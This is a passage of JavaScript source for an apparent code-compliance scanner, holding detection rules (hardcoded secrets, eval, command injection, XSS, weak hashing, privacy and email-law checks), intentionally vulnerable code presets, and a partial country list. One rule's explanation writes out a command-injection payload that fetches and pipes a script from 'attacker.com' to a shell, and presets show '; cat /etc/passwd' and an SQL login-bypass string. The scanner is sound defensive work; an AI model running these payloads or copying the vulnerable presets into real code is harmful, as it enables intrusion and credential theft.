    owasp: 'OWASP Top 10 A02:2021 - Cryptographic Failures',
    complianceControl: 'DATA-01',
    test: (line) => {
      if (/BEGIN (RSA|OPENSSH|EC|DSA)? ?PRIVATE KEY/.test(line)) return true;
      return /(JWT_SECRET|jwtSecret|TOKEN_SECRET)\s*=\s*['"][^'"]{8,}['"]/i.test(line);
    },
    exploit: 'Knowing the JWT signing secret allows attackers to forge administrative tokens with arbitrary claims and impersonate any user or superuser.',
    badCode: `jwt.sign(payload, "my_static_secret_key_12345");`,
    goodCode: `jwt.sign(payload, process.env.JWT_SIGNING_KEY);`
  },

  // --- Remote Code Execution & Dangerous Functions ---
  {
    id: 'SEC-RCE-EVAL',
    category: 'Remote Code Execution',
    title: 'Dangerous Dynamic Evaluation (eval / Function constructor)',
    severity: 'critical',
    cwe: 'CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code',
    owasp: 'OWASP Top 10 A03:2021 - Injection',
    complianceControl: 'OPS-01',
    test: (line) => /\b(eval|new\s+Function|vm\.runInThisContext)\s*\(/.test(line),
    exploit: 'Enables Remote Code Execution (RCE). An attacker sending input to eval() can execute arbitrary system commands, spawn reverse shells, or seize host servers.',
    badCode: `const output = eval("calculate(" + req.query.expr + ")");`,
    goodCode: `// Avoid eval! Use safe parser libraries like mathjs or JSON.parse`
  },
  {
    id: 'SEC-CMD-INJECT',
    category: 'Remote Code Execution',
    title: 'Command Injection Sink (child_process.exec / os.system)',
    severity: 'critical',
    cwe: 'CWE-78: Improper Neutralization of Special Elements used in an OS Command',
    owasp: 'OWASP Top 10 A03:2021 - Injection',
    complianceControl: 'OPS-01',
    test: (line) => {
      return /(child_process\.exec|exec\s*\(|os\.system|subprocess\.Popen\([^)]*shell=True)/.test(line) &&
             /(\+|\$\{|\%s|\.format)/.test(line);
    },
    exploit: 'Attackers can append command separators like `;` or `|` (e.g., `8.8.8.8; curl http://attacker.com/malware.sh | sh`) to run arbitrary host commands.',
    badCode: `exec("ping -c 1 " + req.query.target);`,
    goodCode: `// Use execFile with explicit argument arrays, never raw shell strings:
const { execFile } = require('child_process');
execFile('ping', ['-c', '1', req.query.target]);`
  },
  {
    id: 'SEC-XSS-DOM',
    category: 'Injection & XSS',
    title: 'Cross-Site Scripting (XSS) via innerHTML / dangerouslySetInnerHTML',
    severity: 'high',
    cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    owasp: 'OWASP Top 10 A03:2021 - Injection',
    complianceControl: 'OPS-01',
    test: (line) => /(dangerouslySetInnerHTML|\.innerHTML\s*=)/.test(line),
    exploit: 'Attackers can inject malicious `<script>` tags that hijack user sessions, steal authorization cookies, or perform actions on behalf of victims.',
    badCode: `container.innerHTML = "<div>" + userInput + "</div>";`,
    goodCode: `container.textContent = userInput; // or use DOMPurify.sanitize(userInput)`
  },

  // --- Cryptographic Weakness ---
  {
    id: 'SEC-CRYPTO-WEAK',
    category: 'Cryptographic Weakness',
    title: 'Insecure Hashing Algorithm (MD5 / SHA1) for Passwords or Signatures',
    severity: 'high',
    cwe: 'CWE-328: Use of Weak Hash',
    owasp: 'OWASP Top 10 A02:2021 - Cryptographic Failures',
    complianceControl: 'DATA-01',
    test: (line) => /(createHash\(['"](md5|sha1)['"]\)|hashlib\.(md5|sha1)\(|md5\(|sha1\()/i.test(line),
    exploit: 'MD5 and SHA-1 are cryptographically broken with known collision attacks. Password hashes can be reversed almost instantly using public rainbow tables.',
    badCode: `const hash = crypto.createHash('md5').update(password).digest('hex');`,
    goodCode: `// Use slow salted hashing designed for credentials (bcrypt / Argon2):
const hash = await bcrypt.hash(password, 12);`
  },

  // --- COPPA & Minor Age Gate (Privacy & Child Safety) ---
  {
    id: 'SEC-PRIV-COPPA-AGEGATE',
    category: 'Privacy & Child Safety',
    title: 'Missing COPPA / Minor Age Gate in Registration or Authentication Flow',
    severity: 'critical',
    cwe: 'CWE-359: Exposure of Private Personal Information to an Unauthorized Actor',
    owasp: 'OWASP Top 10 A04:2021 - Insecure Design',
    complianceControl: 'PRIV-06',
    test: (line, rawCode, idx, lines) => {
      const isAuthOrReg = /(app|router)\.(post|put)\s*\(\s*['"][^'"]*(register|signup|create-account|users)['"]/i.test(line) ||
        /function\s+(register|signUp|createUser|handleRegistration|registration|signupScreen|signupPage|registerScreen|registerPage)\w*\b/i.test(line) ||
        /class\s+(Register|SignUp|Registration|CreateAccount)\w*\s+extends/i.test(line) ||
        /auth\.signUp\s*\(/i.test(line) ||
        /createUserWithEmailAndPassword\s*\(/i.test(line) ||
        /<form[^>]+(id|class|name|action)=["'][^"']*(register|signup|create-account)/i.test(line) ||
        /const\s+(register|signup|createUser|registerPage|signupScreen|registration)\w*\s*=\s*(async\s*)?\(/i.test(line);

      if (!isAuthOrReg) return false;

      const codeArr = lines || (rawCode ? rawCode.split('\n') : []);
      const start = Math.max(0, (idx || 0) - 5);
      const end = Math.min(codeArr.length, (idx || 0) + 80);
      const codeOnly = codeArr.slice(start, end)
        .filter(l => {
          const t = l.trim();
          return !t.startsWith('//') && !t.startsWith('*') && !t.startsWith('#');
        })
        .join('\n');

      const hasAgeGate = /(dob|birth_?date|birthday|bday|date_?of_?birth|birth_?year|age_?gate|parental_?consent|parent_?consent|coppa|under_?13|under_?16|under_?18|min_?age|verify_?age|age_?verif|is_?adult|is_?over_?13|is_?over_?18|over_?13|over_?18|user_?age|age_?check)/i.test(codeOnly);
      return !hasAgeGate;
    },
    exploit: 'Collecting personal information (names, emails, passwords, identifiers) from children without a neutral age gate and verifiable parental consent (VPC) violates US COPPA (15 U.S.C. §§ 6501-6506, up to $51,744 per violation FTC fine), EU GDPR Article 8 (€20M / 4% global turnover), and India DPDP Act 2023 Section 9 (up to ₹250 Crore penalty for tracking minors without VPC).',
    badCode: `// ⚠️ VULNERABLE: Direct registration without COPPA age verification
app.post('/api/auth/register', async (req, res) => {
  const { username, email, password } = req.body;
  const user = await db.users.create({ username, email, password });
  res.json(user);
});`,
    goodCode: `// ✅ SECURE: Neutral age gate + parental consent protocol
app.post('/api/auth/register', async (req, res) => {
  const { username, email, password, birthdate } = req.body;
  const age = calculateAge(new Date(birthdate));
  if (age < 13) {
    return res.status(403).json({ 
      error: "COPPA / GDPR Art 8: Verifiable Parental Consent (VPC) required for users under 13." 
    });
  }
  const user = await db.users.create({ username, email, password, birthdate });
  res.json(user);
});`
  },

  // --- Google Fonts Dynamic Runtime Fetching ---
  {
    id: 'SEC-PRIV-GOOGLE-FONTS',
    category: 'Privacy & Data Sovereignty',
    title: 'Unconsented Dynamic Google Fonts Runtime Fetch (GDPR / Munich Court Violation)',
    severity: 'high',
    cwe: 'CWE-359: Privacy Violation / External Data Transmission',
    owasp: 'OWASP Top 10 A01:2021 - Broken Access Control',
    complianceControl: 'PRIV-07',
    test: (line, rawCode, idx, lines) => {
      const isGoogleFontUsage = /GoogleFonts\.[a-zA-Z0-9_]+\s*\(/i.test(line) ||
        /import\s+['"]package:google_fonts\/google_fonts\.dart['"]/i.test(line) ||
        /google_fonts\s*:\s*.+/i.test(line) ||
        /<link[^>]+href=["']https?:\/\/(fonts\.googleapis\.com|fonts\.gstatic\.com)/i.test(line) ||
        /@import\s+(url\()?[`'"]https?:\/\/(fonts\.googleapis\.com|fonts\.gstatic\.com)/i.test(line) ||
        /src:\s*url\([`'"]?https?:\/\/(fonts\.googleapis\.com|fonts\.gstatic\.com)/i.test(line);

      if (!isGoogleFontUsage) return false;

      // Differentiate Flutter vs Web font handling
      const isFlutterLine = /GoogleFonts|google_fonts/i.test(line);

      if (isFlutterLine) {
        const codeArr = lines || (rawCode ? rawCode.split('\n') : []);
        // Safe if Flutter sets allowRuntimeFetching = false
        const hasActiveConfig = codeArr.some(l => {
          const trimmed = l.trim();
          return !trimmed.startsWith('//') && !trimmed.startsWith('*') && !trimmed.startsWith('#') &&
            /allowRuntimeFetching\s*=\s*false/i.test(trimmed);
        });

        // Safe if pubspec or bundle declares bundled font assets in assets:
        const hasBundledFontAssets = codeArr.some(l => {
          const trimmed = l.trim();
          return !trimmed.startsWith('#') && !trimmed.startsWith('//') &&
            /-\s+.*(fonts\/|google_fonts\/|\.(ttf|otf|woff2))/i.test(trimmed);
        });

        if (hasActiveConfig || hasBundledFontAssets) {
          return false;
        }
        return true;
      }

      // Web/CSS dynamic font links are always violations unless self-hosted
      return true;
    },
    exploit: 'Dynamic runtime font fetching transmits the user\'s IP address and browser user-agent to Google servers without prior opt-in consent. In 2022, the Munich Regional Court ruled this an illegal GDPR Art 6 violation with statutory damages and fines up to €250,000 for each violation. Also forbidden in Germany, Austria, and EU under Schrems II transatlantic data transfer restrictions.',
    badCode: `// ⚠️ VULNERABLE (Flutter): Dynamic runtime HTTP fetch to Google servers
import 'package:google_fonts/google_fonts.dart';

Text('Welcome', style: GoogleFonts.roboto(fontSize: 16));`,
    goodCode: `// ✅ SECURE (Flutter): Disable dynamic fetching & bundle fonts locally in assets
void main() {
  WidgetsFlutterBinding.ensureInitialized();
  GoogleFonts.config.allowRuntimeFetching = false; // Prevents dynamic IP leaks
  runApp(MyApp());
}
// In pubspec.yaml: flutter: assets: - assets/fonts/Roboto-Regular.ttf`
  },

  // --- Session Replay SDK Detection ---
  {
    id: 'SEC-PRIV-SESSION-REPLAY',
    category: 'Privacy & Wiretapping Risk',
    title: 'Session Replay SDK Initialized Without Prior Consent or Input Masking',
    severity: 'high',
    cwe: 'CWE-359: Exposure of Private Information via Wiretapping/Session Capture',
    owasp: 'OWASP Top 10 A04:2021 - Insecure Design',
    complianceControl: 'PRIV-08',
    test: (line, rawCode, idx, lines) => {
      const isReplaySdk = /(LogRocket\.init\s*\(|FS\.identify\s*\(|FS\.restart\s*\(|FS\.init\s*\(|FullStory\.init\s*\(|window\[["']_fs_namespace["']\]|window\._fs_namespace|fullstory\.com\/s\/fs\.js|smartlookClient\.init\s*\(|smartlook\s*\(\s*['"]init['"]|Smartlook\.(instance\.)?(start|init|setup)\s*\(|clarity\s*\(\s*['"]init['"]|clarity\.ms|hotjar\.com|hj\s*\(\s*['"]init['"]|_hjSettings|heap\.load\s*\()/i.test(line);

      if (!isReplaySdk) return false;

      const codeArr = lines || (rawCode ? rawCode.split('\n') : []);
      const start = Math.max(0, (idx || 0) - 25);
      const end = Math.min(codeArr.length, (idx || 0) + 15);
      const surrounding = codeArr.slice(start, end).join('\n');

      const hasConsent = /(if\s*\([^)]*(consent|cookieConsent|optIn|hasUserConsent|consent_status|analyticsConsent|trackingConsent|isConsented)|consentGranted|userConsentState|onConsent|consent\.granted|clarity\(['"]consent['"]|hj\(['"]consent['"]|FS\(['"]consent['"]|Smartlook\.(instance\.)?setConsent)/i.test(surrounding);
      return !hasConsent;
    },
    exploit: 'Session replay SDKs record exact user mouse movements, clicks, scrolls, and raw text entries. In the US, mass class actions under the Pennsylvania Wiretap Act, Florida Security of Communications Act, and California CIPA penalize unconsented interception with statutory damages of $1,000–$5,000 per visitor. In the EU, recording sessions without prior active opt-in consent violates GDPR Art 6 and ePrivacy.',
    badCode: `// ⚠️ VULNERABLE: Direct initialization records user sessions unconditionally
import LogRocket from 'logrocket';
LogRocket.init('app-id/my-org'); // Captures all keystrokes and DOM state!`,
    goodCode: `// ✅ SECURE: Gated behind explicit cookie consent + strict DOM sanitization
if (userConsentState.analyticsOptIn === true) {
  LogRocket.init('app-id/my-org', {
    dom: {
      inputSanitizer: true // Redacts all passwords, card numbers, and PII
    }
  });
}`
  },

  // --- Commercial Email Unsubscribe Tokens & Physical Address ---
  {
    id: 'SEC-COMM-EMAIL-COMPLIANCE',
    category: 'Commercial Messaging Compliance',
    title: 'Missing Unsubscribe Token or Physical Address in Mail Dispatch / Template',
    severity: 'high',
    cwe: 'CWE-1059: Incomplete Regulatory Message Requirements',
    owasp: 'OWASP Top 10 A04:2021 - Insecure Design',
    complianceControl: 'COMM-01',
    test: (line, rawCode, idx, lines) => {
      const isMailSend = /(transporter|mailer|mail|client|sgMail|sendgrid|resend\.emails|mailgun\.messages|ses|nodemailer)\.(sendMail|sendEmail|send|create)\s*\(/i.test(line) ||
        /const\s+(mailOptions|emailData|messageData|emailPayload|newsletterOptions)\s*=\s*\{/i.test(line) ||
        /(sendWeeklyDigest|sendNewsletter|sendMarketingEmail|sendEmailNotification|dispatchEmail)\s*\(/i.test(line) ||
        /<(table|div|section|body)[^>]*(id|class)=["'][^"']*(email|newsletter|mail-content|marketing)["']/i.test(line);

      if (!isMailSend) return false;

      const codeArr = lines || (rawCode ? rawCode.split('\n') : []);
      const start = Math.max(0, (idx || 0) - 5);
      const end = Math.min(codeArr.length, (idx || 0) + 50);
      const codeOnly = codeArr.slice(start, end)
        .filter(l => {
          const t = l.trim();
          return !t.startsWith('//') && !t.startsWith('*') && !t.startsWith('#');
        })
        .join('\n');

      const hasUnsub = /(unsubscribe|List-Unsubscribe|\{\{\s*unsubscribe|\<%asm_group_unsubscribe_url%\>|optout|opt-out|manage-preferences)/i.test(codeOnly);
      const hasAddress = /(address|street|suite|p\.?o\.?\s*box|postal\s*code|zip\s*code|\b\d{5}\b|\{\{\s*(company|sender|physical)?_?address\s*\}\})/i.test(codeOnly);

      return (!hasUnsub || !hasAddress);
    },
    exploit: 'Dispatching commercial emails without a working one-click unsubscribe mechanism and a valid physical postal address violates the US CAN-SPAM Act ($50,120 fine per non-compliant email), Canada Anti-Spam Legislation CASL (penalties up to $10,000,000 CAD), EU ePrivacy Directive, and Australia Spam Act 2003. Mailbox providers (Gmail, Yahoo) also instantly drop sender domain reputation.',
    badCode: `// ⚠️ VULNERABLE: Email dispatch missing unsubscribe token and postal address
await resend.emails.send({
  from: 'newsletter@example.com',
  to: user.email,
  subject: 'Weekly Product Updates',
  html: '<h1>Welcome!</h1><p>Check out our new features.</p>'
});`,
    goodCode: `// ✅ SECURE: Includes one-click unsubscribe token and registered physical address
await resend.emails.send({
  from: 'newsletter@example.com',
  to: user.email,
  subject: 'Weekly Product Updates',
  headers: {
    'List-Unsubscribe': '<https://example.com/api/unsubscribe?token={{token}}>'
  },
  html: \`
    <h1>Product Updates</h1>
    <p>Check out our new features.</p>
    <footer style="font-size: 11px; color: #888;">
      <a href="{{unsubscribe_url}}">Unsubscribe from this list</a><br>
      Acme Corp Inc., 100 Main Street, Suite 400, San Francisco, CA 94105, USA
    </footer>\`
});`
  }
];

// --- 6. Code Presets for Quick Testing ---
const CODE_PRESETS = {
  sqli: `// ⚠️ VULNERABLE: Direct string concatenation allows database hijack
const express = require('express');
const db = require('./database');
const app = express();

app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;
  
  // CRITICAL FLAW: User input directly concatenated into SQL statement!
  // Attacker can pass: username = "admin' OR 1=1 --" to bypass auth!
  const sql = "SELECT id, email FROM accounts WHERE username = '" + username + "' AND pass = '" + password + "'";
  
  const results = await db.query(sql);
  res.json(results);
});`,

  secrets: `// ⚠️ VULNERABLE: Hardcoded production secrets in codebase
const AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE";
const AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
const OPENAI_API_KEY = "sk-TEST-DEMO-MOCK-API-KEY-DO-NOT-USE-123456789";
const DATABASE_URL = "postgres://root:SuperSecretPassword2024!@production-cluster.internal:5432/core_db";
const JWT_SECRET = "jwt_super_secret_signing_key_9918237";`,

  eval: `// ⚠️ VULNERABLE: Command Injection & Dynamic eval
const { exec } = require('child_process');

app.get('/api/ping', (req, res) => {
  const host = req.query.host;
  
  // CRITICAL FLAW: Attacker can supply "8.8.8.8; cat /etc/passwd"
  exec("ping -c 1 " + host, (err, stdout) => {
    res.send(stdout);
  });
  
  // CRITICAL: Dynamic eval executes arbitrary attacker code
  const filter = req.query.filter;
  eval("console.log('Processed filter: ' + " + filter + ")");
});`,

  coppa: `// ⚠️ VULNERABLE: Registration flow missing COPPA Age Gate
const express = require('express');
const app = express();
const db = require('./database');

// CRITICAL FLAW: User credentials collected without age verification!
// Violates US COPPA (15 U.S.C. § 6501), EU GDPR Art 8, and India DPDP 2023 Sec 9.
app.post('/api/auth/register', async (req, res) => {
  const { username, email, password } = req.body;
  
  // Creates account directly without verifying Date of Birth or Parental Consent!
  const newUser = await db.users.create({
    username: username,
    email: email,
    password_hash: hashPassword(password)
  });
  
  res.status(201).json({ success: true, user: newUser });
});`,

  fonts: `// ⚠️ VULNERABLE: Dynamic Google Fonts runtime fetching in Flutter / Web
// Violates GDPR Art 6 & Munich Regional Court 2022 Ruling (Exfiltrates user IP to Google)

import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';

void main() {
  // CRITICAL FLAW: Missing GoogleFonts.config.allowRuntimeFetching = false;
  // Triggers dynamic HTTP requests to fonts.googleapis.com on every app launch!
  runApp(const MyApp());
}

class HeaderWidget extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return Text(
      'Welcome to ComplianceShield',
      style: GoogleFonts.roboto(fontSize: 24, fontWeight: FontWeight.bold),
    );
  }
}`,

  replay: `// ⚠️ VULNERABLE: Unconsented Session Replay SDK initialized
// Violates GDPR Art 6/7, California CPRA, and PA/FL Wiretap Acts

import LogRocket from 'logrocket';

// CRITICAL FLAW: Session replay SDK initialized immediately upon page load
// Records user keystrokes, form inputs, and mouse gestures without consent!
LogRocket.init('enterprise-org/prod-app');

// Also loading FullStory without input masking or consent gate:
window['_fs_namespace'] = 'FS';
FS.identify('user-1029', {
  displayName: 'Alex Mercer',
  email: 'alex@example.com'
});`,

  email: `// ⚠️ VULNERABLE: Commercial email dispatch missing Unsubscribe & Postal Address
// Violates US CAN-SPAM Act ($50,120 fine), Canada CASL ($10M CAD fine), and UK PECR

const nodemailer = require('nodemailer');
const transporter = nodemailer.createTransporter({ /* SMTP config */ });

async function sendWeeklyDigest(userEmail) {
  // CRITICAL FLAW: Missing {{unsubscribe_url}} and missing physical postal street address!
  await transporter.sendMail({
    from: 'marketing@company.com',
    to: userEmail,
    subject: 'Your Weekly Feature Digest & Special Offers',
    html: \`
      <div style="font-family: sans-serif; padding: 20px;">
        <h2>Check out our new premium releases!</h2>
        <p>Save 30% this week only on all enterprise tier upgrades.</p>
        <p><a href="https://company.com/upgrade">Claim Discount Now</a></p>
      </div>
    \`
  });
}`,

  flutter_bundle: `// ==========================================
// File: pubspec.yaml (Flutter App Bundle)
// ==========================================
name: enterprise_mobile_app
description: "A production mobile app bundle"
dependencies:
  flutter:
    sdk: flutter
  google_fonts: ^6.2.1

// ==========================================
// File: lib/main.dart
// ==========================================
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';

void main() {
  // CRITICAL FLAW: Missing GoogleFonts.config.allowRuntimeFetching = false;
  runApp(const MobileApp());
}

// ==========================================
// File: lib/views/register_screen.dart
// ==========================================
class RegisterScreen extends StatelessWidget {
  // CRITICAL FLAW: Sign-up form collects email & password with no COPPA Date-of-Birth gate!
  void submitRegistration(String email, String password) {
    AuthService.createUser(email: email, password: password);
  }
}`,

  secure: `// ✅ SECURE: Parameterized queries, environment variables & bcrypt
require('dotenv').config();
const db = require('./db');
const bcrypt = require('bcrypt');

const DB_URL = process.env.DATABASE_URL;
const JWT_SECRET = process.env.JWT_SECRET;

app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;
  
  // SECURE: Parameterized prepared statement ($1) immunizes against SQL Injection
  const sql = 'SELECT id, email, password_hash FROM accounts WHERE username = $1';
  const result = await db.query(sql, [username]);
  
  if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });
  const valid = await bcrypt.compare(password, result.rows[0].password_hash);
  res.json({ authenticated: valid });
});`
};

// --- 6.2 Worldwide 195-Nation Master Catalogue ---
const GLOBAL_COUNTRY_CATALOGUE = [
  // Europe (44)
  { name: 'Germany', flag: '🇩🇪', region: 'Europe', jId: 'eu' },
  { name: 'France', flag: '🇫🇷', region: 'Europe', jId: 'eu' },
  { name: 'Italy', flag: '🇮🇹', region: 'Europe', jId: 'eu' },
  { name: 'Spain', flag: '🇪🇸', region: 'Europe', jId: 'eu' },
  { name: 'Netherlands', flag: '🇳🇱', region: 'Europe', jId: 'eu' },
  { name: 'Belgium', flag: '🇧🇪', region: 'Europe', jId: 'eu' },
  { name: 'Austria', flag: '🇦🇹', region: 'Europe', jId: 'eu' },
  { name: 'Sweden', flag: '🇸🇪', region: 'Europe', jId: 'eu' },
  { name: 'Poland', flag: '🇵🇱', region: 'Europe', jId: 'eu' },
  { name: 'Ireland', flag: '🇮🇪', region: 'Europe', jId: 'eu' },
  { name: 'Denmark', flag: '🇩🇰', region: 'Europe', jId: 'eu' },
  { name: 'Finland', flag: '🇫🇮', region: 'Europe', jId: 'eu' },
  { name: 'Portugal', flag: '🇵🇹', region: 'Europe', jId: 'eu' },
  { name: 'Greece', flag: '🇬🇷', region: 'Europe', jId: 'eu' },
  { name: 'Czech Republic', flag: '🇨🇿', region: 'Europe', jId: 'eu' },
  { name: 'Romania', flag: '🇷🇴', region: 'Europe', jId: 'eu' },
  { name: 'Hungary', flag: '🇭🇺', region: 'Europe', jId: 'eu' },
  { name: 'Slovakia', flag: '🇸🇰', region: 'Europe', jId: 'eu' },
  { name: 'Bulgaria', flag: '🇧🇬', region: 'Europe', jId: 'eu' },
  { name: 'Croatia', flag: '🇭🇷', region: 'Europe', jId: 'eu' },
  { name: 'Lithuania', flag: '🇱🇹', region: 'Europe', jId: 'eu' },
  { name: 'Slovenia', flag: '🇸🇮', region: 'Europe', jId: 'eu' },
  { name: 'Latvia', flag: '🇱🇻', region: 'Europe', jId: 'eu' },
  { name: 'Estonia', flag: '🇪🇪', region: 'Europe', jId: 'eu' },
  { name: 'Cyprus', flag: '🇨🇾', region: 'Europe', jId: 'eu' },
  { name: 'Luxembourg', flag: '🇱🇺', region: 'Europe', jId: 'eu' },
  { name: 'Malta', flag: '🇲🇹', region: 'Europe', jId: 'eu' },
  { name: 'Norway', flag: '🇳🇴', region: 'Europe', jId: 'eu' },
  { name: 'Iceland', flag: '🇮🇸', region: 'Europe', jId: 'eu' },
  { name: 'Liechtenstein', flag: '🇱🇮', region: 'Europe', jId: 'eu' },
  { name: 'United Kingdom', flag: '🇬🇧', region: 'Europe', jId: 'uk' },
  { name: 'Switzerland', flag: '🇨🇭', region: 'Europe', jId: 'switzerland' },
  { name: 'Ukraine', flag: '🇺🇦', region: 'Europe', jId: 'global-baseline' },
  { name: 'Serbia', flag: '🇷🇸', region: 'Europe', jId: 'global-baseline' },
  { name: 'Albania', flag: '🇦🇱', region: 'Europe', jId: 'global-baseline' },
  { name: 'Bosnia and Herzegovina', flag: '🇧🇦', region: 'Europe', jId: 'global-baseline' },
  { name: 'North Macedonia', flag: '🇲🇰', region: 'Europe', jId: 'global-baseline' },
  { name: 'Montenegro', flag: '🇲🇪', region: 'Europe', jId: 'global-baseline' },
  { name: 'Moldova', flag: '🇲🇩', region: 'Europe', jId: 'global-baseline' },
  { name: 'Belarus', flag: '🇧🇾', region: 'Europe', jId: 'global-baseline' },
  { name: 'Andorra', flag: '🇦🇩', region: 'Europe', jId: 'global-baseline' },
  { name: 'Monaco', flag: '🇲🇨', region: 'Europe', jId: 'global-baseline' },
  { name: 'San Marino', flag: '🇸🇲', region: 'Europe', jId: 'global-baseline' },
  { name: 'Vatican City', flag: '🇻🇦', region: 'Europe', jId: 'global-baseline' },

  // Americas (35)
  { name: 'United States', flag: '🇺🇸', region: 'North America', jId: 'us-composite' },
  { name: 'Canada', flag: '🇨🇦', region: 'North America', jId: 'canada' },
  { name: 'Mexico', flag: '🇲🇽', region: 'North America', jId: 'global-baseline' },
  { name: 'Brazil', flag: '🇧🇷', region: 'Latin America', jId: 'brazil' },
  { name: 'Argentina', flag: '🇦🇷', region: 'Latin America', jId: 'global-baseline' },
  { name: 'Colombia', flag: '🇨🇴', region: 'Latin America', jId: 'global-baseline' },
  { name: 'Chile', flag: '🇨🇱', region: 'Latin America', jId: 'global-baseline' },
  { name: 'Peru', flag: '🇵🇪', region: 'Latin America', jId: 'global-baseline' },
  { name: 'Ecuador', flag: '🇪🇨', region: 'Latin America', jId: 'global-baseline' },
  { name: 'Bolivia', flag: '🇧🇴', region: 'Latin America', jId: 'global-baseline' },
  { name: 'Paraguay', flag: '🇵🇾', region: 'Latin America', jId: 'global-baseline' },
  { name: 'Uruguay', flag: '🇺🇾', region: 'Latin America', jId: 'global-baseline' },
  { name: 'Guyana', flag: '🇬🇾', region: 'Latin America', jId: 'global-baseline' },
  { name: 'Suriname', flag: '🇸🇷', region: 'Latin America', jId: 'global-baseline' },
  { name: 'Venezuela', flag: '🇻🇪', region: 'Latin America', jId: 'global-baseline' },
  { name: 'Costa Rica', flag: '🇨🇷', region: 'Central America', jId: 'global-baseline' },
  { name: 'Panama', flag: '🇵🇦', region: 'Central America', jId: 'global-baseline' },
  { name: 'Guatemala', flag: '🇬🇹', region: 'Central America', jId: 'global-baseline' },
  { name: 'Honduras', flag: '🇭🇳', region: 'Central America', jId: 'global-baseline' },
  { name: 'El Salvador', flag: '🇸🇻', region: 'Central America', jId: 'global-baseline' },
  { name: 'Nicaragua', flag: '🇳🇮', region: 'Central America', jId: 'global-baseline' },
  { name: 'Belize', flag: '🇧🇿', region: 'Central America', jId: 'global-baseline' },
  { name: 'Cuba', flag: '🇨🇺', region: 'Caribbean', jId: 'global-baseline' },
  { name: 'Dominican Republic', flag: '🇩🇴', region: 'Caribbean', jId: 'global-baseline' },
  { name: 'Haiti', flag: '🇭🇹', region: 'Caribbean', jId: 'global-baseline' },
  { name: 'Jamaica', flag: '🇯🇲', region: 'Caribbean', jId: 'global-baseline' },
  { name: 'Bahamas', flag: '🇧🇸', region: 'Caribbean', jId: 'global-baseline' },
  { name: 'Barbados', flag: '🇧🇧', region: 'Caribbean', jId: 'global-baseline' },
  { name: 'Trinidad and Tobago', flag: '🇹🇹', region: 'Caribbean', jId: 'global-baseline' },
  { name: 'Saint Lucia', flag: '🇱🇨', region: 'Caribbean', jId: 'global-baseline' },
  { name: 'Antigua and Barbuda', flag: '🇦🇬', region: 'Caribbean', jId: 'global-baseline' },
  { name: 'Grenada', flag: '🇬🇩', region: 'Caribbean', jId: 'global-baseline' },
  { name: 'Saint Vincent and the Grenadines', flag: '🇻🇨', region: 'Caribbean', jId: 'global-baseline' },
  { name: 'Saint Kitts and Nevis', flag: '🇰🇳', region: 'Caribbean', jId: 'global-baseline' },
  { name: 'Dominica', flag: '🇩🇲', region: 'Caribbean', jId: 'global-baseline' },

  // Asia (48)
  { name: 'China', flag: '🇨🇳', region: 'Asia-Pacific', jId: 'china' },
  { name: 'India', flag: '🇮🇳', region: 'Asia-Pacific', jId: 'india' },
  { name: 'Japan', flag: '🇯🇵', region: 'Asia-Pacific', jId: 'japan' },
  { name: 'South Korea', flag: '🇰🇷', region: 'Asia-Pacific', jId: 'korea' },
  { name: 'Singapore', flag: '🇸🇬', region: 'Asia-Pacific', jId: 'singapore' },
  { name: 'Indonesia', flag: '🇮🇩', region: 'Asia-Pacific', jId: 'global-baseline' },
  { name: 'Malaysia', flag: '🇲🇾', region: 'Asia-Pacific', jId: 'global-baseline' },
  { name: 'Thailand', flag: '🇹🇭', region: 'Asia-Pacific', jId: 'global-baseline' },
  { name: 'Vietnam', flag: '🇻🇳', region: 'Asia-Pacific', jId: 'global-baseline' },
  { name: 'Philippines', flag: '🇵🇭', region: 'Asia-Pacific', jId: 'global-baseline' },
  { name: 'Pakistan', flag: '🇵🇰', region: 'South Asia', jId: 'global-baseline' },
  { name: 'Bangladesh', flag: '🇧🇩', region: 'South Asia', jId: 'global-baseline' },
  { name: 'Sri Lanka', flag: '🇱🇰', region: 'South Asia', jId: 'global-baseline' },
  { name: 'Nepal', flag: '🇳🇵', region: 'South Asia', jId: 'global-baseline' },
  { name: 'Bhutan', flag: '🇧🇹', region: 'South Asia', jId: 'global-baseline' },
  { name: 'Maldives', flag: '🇲🇻', region: 'South Asia', jId: 'global-baseline' },
  { name: 'Afghanistan', flag: '🇦🇫', region: 'South Asia', jId: 'global-baseline' },
  { name: 'Saudi Arabia', flag: '🇸🇦', region: 'Middle East', jId: 'saudi' },
  { name: 'United Arab Emirates', flag: '🇦🇪', region: 'Middle East', jId: 'uae' },
  { name: 'Qatar', flag: '🇶🇦', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Kuwait', flag: '🇰🇼', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Bahrain', flag: '🇧🇭', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Oman', flag: '🇴🇲', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Israel', flag: '🇮🇱', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Turkey', flag: '🇹🇷', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Jordan', flag: '🇯🇴', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Lebanon', flag: '🇱🇧', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Iraq', flag: '🇮🇶', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Iran', flag: '🇮🇷', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Syria', flag: '🇸🇾', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Yemen', flag: '🇾🇪', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Palestine', flag: '🇵🇸', region: 'Middle East', jId: 'global-baseline' },
  { name: 'Kazakhstan', flag: '🇰🇿', region: 'Central Asia', jId: 'global-baseline' },
  { name: 'Uzbekistan', flag: '🇺🇿', region: 'Central Asia', jId: 'global-baseline' },
  { name: 'Turkmenistan', flag: '🇹🇲', region: 'Central Asia', jId: 'global-baseline' },
